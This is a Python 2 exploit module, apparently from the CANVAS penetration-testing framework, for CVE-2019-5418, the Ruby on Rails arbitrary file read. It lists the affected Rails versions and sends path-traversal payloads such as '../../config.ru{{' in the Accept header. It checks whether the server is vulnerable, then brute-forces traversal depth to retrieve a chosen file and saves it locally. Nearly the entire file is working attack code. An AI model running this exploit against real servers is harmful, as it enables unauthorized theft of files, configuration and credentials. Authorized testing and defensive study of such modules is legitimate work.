#!/usr/bin/env python2
import os
import sys
import time
import threading
if '.' not in sys.path:
    sys.path.append('.')

import canvasengine
from exploitutils import *
from tcpexploit import tcpexploit
from exploitmanager import exploitmanager
from ExploitTypes.CommandLineExecuter import CommandExploit

from libs.spkproxy import urlopen
from libs.canvasos import canvasos



NAME                            = 'Ruby on Rails Arbitrary File Read (CVE-2019-5418)'
DESCRIPTION                     = 'Arbitrary File Read in Ruby on Rails using a malicious HTTP Header Accept'
DOCUMENTATION                   = {}
DOCUMENTATION['VENDOR']         = "Rails"
DOCUMENTATION["Repeatability"]  = 'Infinite'
DOCUMENTATION["CVE Name"]       = 'CVE-2019-5418'
DOCUMENTATION["CVE Url"]        = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=2019-5418"
DOCUMENTATION["References"]     = "https://groups.google.com/forum/#!topic/rubyonrails-security/pFRKI96Sm8Q"
DOCUMENTATION["Date public"]    = "13/03/2019"
DOCUMENTATION["NOTES"]          = """

The vulnerability resides in Action View in combination with calls to 'render file:' in a controller.
You need to place in the corresponding textfield the path to the controller that uses 'render file' 
in a similar way to the code below:


class HelloController < ApplicationController
  def index
    render file: "#{Rails.root}/some/file"
  end
end


Vulnerable Rails versions:
 * < 5.2.2.1
 * < 5.1.6.2
 * < 5.0.7.2
 * < 4.2.11.1

Tested on:
 * Ubuntu 18.10, Rails 5.2.1
"""

VERSION                         = "1.0"

PROPERTY                        = {}
PROPERTY['TYPE']                = "Web Exploits"
PROPERTY['SITE']                = "Remote"
PROPERTY['ARCH']                = [ ["UNIX", "Windows"] ]
PROPERTY['VERSION']             = [ "5.2.1" ]


class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)

        self.name = NAME
        self.path = os.path.dirname(__file__)
        self.payloadType = 0

        self.host = ""
        self.hostname = ''
        self.port = 80
        self.https = False
        self.file_to_download = ''
        self.ua = None
        self.filedata = None

        self.basicauth_user = ""
        self.basicauth_password = ""


    def getargs(self):
        self.host = self.target.interface
        self.hostname = self.argsDict.get('hostname', self.hostname)
        self.port = int(self.argsDict.get("port", self.port))
        self.getarg('https')
        self.getarg('path')
        self.getarg('basicauth_user')
        self.getarg('basicauth_password')
        self.getarg('file_to_download')
        self.basicauth = self.basicauth_user != ''

        self.blind = True

        if self.hostname == '' or self.hostname is None:
            self.hostname = self.host

    def send_request(self, url, auth, headers = []):        
        logging.debug('URL: ' + url)
        (fd, code) = urlopen(url,
                         verb='GET',
                         exploit=self,
                         hostname=self.hostname,
                         auth=auth,
                         extraheaders=headers,
                         noresponse=False,
                         entireresponse=False,
                         return_response_code=True
                    )
        return (fd.read(), code)

    def build_url(self,  path=''):
        target = 'https' if self.https else 'http'
        target += '://' + self.hostname
        target += ':' + str(self.port) if self.port not in (80, 443) else ''
        target += path if path else '/'
        return target

    def send_payload(self, filename_path):
        auth = None
        if self.basicauth:
            logging.debug('Using basic auth {}:{}'.format(self.basicauth_user,
                                                          self.basicauth_password))
            auth = spkproxy.BasicAuth(self.basicauth_user, self.basicauth_password)

        url = self.build_url(path=self.path)
        headers = [('Accept', filename_path)]
        response, code = self.send_request(url, auth, headers=headers)
        return response, code

    def check_if_vulnerable(self):
        response1, code = self.send_payload('../../config.ru{{')

        if code == 200:
            response2, code = self.send_payload('../../notexist.ru{{')
            if code == 200:
                logging.warning("The response is cached, is not possible to read files arbitrarily")
                return False
            else:
                return True
        else:
            return False

    def bruteforce_path_file(self, filename):
        payload = ''
        for i in range(20):
            payload = '../' * i + filename + '{{'
            response, code = self.send_payload(payload)
            if code == 200:
                return response

        return None

    def run(self):
        result = False

        self.setProgress(0)
        self.getargs()
        self.setInfo("{} attacking {}:{} (in progress)".format(self.name, self.hostname, self.port))

        logging.info("Checking if target is vulnerable")

        self.setProgress(33)

        if self.check_if_vulnerable():
            logging.info("Target appears to be vulnerable")
            data = self.bruteforce_path_file(self.file_to_download)
            if data:
                logging.info('Data downloaded, saving to local file')
                logging.debug('Downloaded data: %s' % data)
                self.filedata = data
                outputdir = self.engine.create_new_session_output_dir(self.hostname, 'downloaded_files')

                try:
                    os.stat(outputdir)
                except OSError:
                    logging.info("Could not find %s so creating it" % outputdir)
                    try:
                        os.mkdir(outputdir)
                    except (OSError, IOError), i:
                        logging.error("Failed to create output directory %s: %s" % (outputdir, str(i)))
                        return False

                ## replace path seperators with '_'
                outputfile = os.path.join(outputdir, self.file_to_download.replace("/", "_").replace("\\", "_"))
                ## remove any ':' that are present as this confuses windows as an alternate data stream
                outputfile = outputfile.replace(":", "")

                try:
                    with open(outputfile, 'wb') as f:
                        f.write(data)
                    logging.info('File downloaded to %s' % outputfile)
                    result = True
                except IOError as e:
                    logging.error('Error while saving file: %s', str(e))
                    result = False                
            else:
                logging.error('File to download not found')
        else:
            logging.error("Target %s is not vulnerable" % self.hostname)

        if result:
            self.setProgress(100)
            self.setInfo("{} in {}:{} done (success)".format(self.name, self.hostname, self.port))
            return True
        else:
            self.setInfo("{} in {}:{} done (failed)".format(self.name, self.hostname, self.port))
            self.setProgress(-1)
            return False


if __name__ == '__main__':
    logging.info("Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION))
    app = theexploit()
    ret = standard_callback_commandline(app)

